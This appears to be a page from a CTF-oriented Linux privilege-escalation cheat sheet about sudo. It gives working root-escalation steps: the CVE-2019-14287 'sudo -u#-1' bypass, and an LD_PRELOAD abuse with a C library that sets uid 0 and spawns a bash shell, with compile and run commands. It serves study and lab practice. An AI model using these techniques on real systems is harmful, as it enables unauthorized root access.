# sudo

[Go back](../index.md#linux-privilege-escalation-)

An excellent reference to exploit sudo: [SUDO_KILLER](https://github.com/TH3xACE/SUDO_KILLER) (1.9k ⭐).

<hr class="sep-both">

## Administrative privileges

[![picklerick](../../../_badges/thm-p/picklerick.svg)](https://tryhackme.com/room/picklerick)
[![linprivesc](../../../_badges/thm-p/linprivesc.svg)](https://tryhackme.com/room/linprivesc#task-12)
[![wgelctf](../../../_badges/thm-p/wgelctf.svg)](https://tryhackme.com/room/wgelctf)
![nibbles](../../../_badges/htb-p/nibbles.svg)
![getsimplecms](../../../_badges/htb-p/getsimplecms.svg)

<div class="row row-cols-md-2"><div>

If you have [administrative privileges](/operating-systems/linux/knowledge/index.md#sudo), you can list them with:

```ps
$ sudo -nl # without a password
$ sudo -l # with a password
```

The first section is about settings and environment variables that may be exploited such as [LD_PRELOAD](#ldpreload).

```text!
Matching Defaults entries for [...]:
    [...] # something here
```
</div><div>

The second section is about your [sudoers](/operating-systems/linux/architecture/index.md#etcsudoers) rights. Such commands may be exploited to get root, search the command on [GTOBins #sudo](gtfobins.md).

```text!
User [...] may run the following commands on [...]:
    (root) /bin/tar
```

➡️ For instance, the user below can run `/bin/tar` as `root`.
</div></div>

<hr class="sep-both">

## sudo before 1.8.28 (CVE-2019-14287)

[![agentsudoctf](../../../_badges/thm-p/agentsudoctf.svg)](https://tryhackme.com/room/agentsudoctf)

<div class="row row-cols-md-2"><div>

If a user was allowed to run one specific command using sudo, such as `tar`, then it was possible for any other user to impersonate the authorized user, and run the command as root too.

```ps
$ sudo -u#-1 tar [...]
$ sudo -u#4294967295 tar [...]
```

💎 Congratulations, you are `root` now!
</div><div>
</div></div>


<hr class="sep-both">

## LD_PRELOAD

<div class="row row-cols-md-2"><div>

If there is `env_keep += LD_PRELOAD` in the permissions displayed by `sudo -l`, then it means that the user can run some code before executing a command as administrator.

The code below replace the gid/uid of the user running the command with `0` <small>(root)</small>. Then, it pops a bash shell <small>(as root!)</small>.

```c
void _init() {
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
</div><div>

Compile it with

```
$ cd /tmp
$ gcc -shared -fPIC init.c -o init.so
```

Then, call the command that you could run as administrator <small>(`tar` here)</small>, while setting the variable path to your script:

```bash!
$ sudo LD_PRELOAD=/tmp/init.so tar
```

💎 Congratulations, you are `root` now!
</div></div>